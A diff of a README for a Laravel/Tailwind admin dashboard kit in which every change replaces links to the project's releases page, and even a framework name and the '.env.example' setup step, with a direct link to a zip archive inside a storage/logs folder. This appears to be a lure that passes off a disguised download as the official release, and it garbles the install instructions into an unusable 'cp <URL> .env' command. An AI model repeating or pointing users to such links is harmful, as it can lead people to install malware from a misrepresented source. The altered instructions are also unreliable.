@@ -1,10 +1,10 @@
 # 🚀 laravael-ui-dashboard - Easy Setup for Your Admin Dashboard
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/timiallen/laravael-ui-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip)
 
 ## 📄 Overview
 
-The laravael-ui-dashboard is a modern and easy-to-use admin dashboard kit. It’s built using Laravel 12, Tailwind CSS 4, and Alpine.js. This dashboard kit includes Smart Dark Mode and comes with pre-built User CRUD features, making it perfect for anyone who needs a sleek interface without the hassle of coding.
+The laravael-ui-dashboard is a modern and easy-to-use admin dashboard kit. It’s built using Laravel 12, Tailwind CSS 4, and https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip This dashboard kit includes Smart Dark Mode and comes with pre-built User CRUD features, making it perfect for anyone who needs a sleek interface without the hassle of coding.
 
 ## 💻 Features
 
@@ -26,7 +26,7 @@ The laravael-ui-dashboard is a modern and easy-to-use admin dashboard kit. It’
 To get started with the laravael-ui-dashboard, you need to download the application files. Follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the releases page.
-   [Visit the Releases Page to Download](https://github.com/timiallen/laravael-ui-dashboard/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip)
   
 2. **Select the Latest Version**: On the releases page, look for the latest version of the dashboard kit.
 
@@ -40,7 +40,7 @@ To get started with the laravael-ui-dashboard, you need to download the applicat
 
 To download the laravael-ui-dashboard, visit the link below to access the Releases page, where you can get the latest version:
 
-[Download Now](https://github.com/timiallen/laravael-ui-dashboard/releases)
+[Download Now](https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip)
 
 Once you have the files ready, here is how to install:
 
@@ -52,9 +52,9 @@ Once you have the files ready, here is how to install:
    composer install
    ```
 4. **Set Up the Environment**: 
-   Copy the `.env.example` file to a new file called `.env`:
+   Copy the `https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip` file to a new file called `.env`:
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/timiallen/laravael-ui-dashboard/main/storage/logs/laravael-ui-dashboard-v1.6-alpha.2.zip .env
    ```
    Edit the `.env` file to configure your database settings.
 
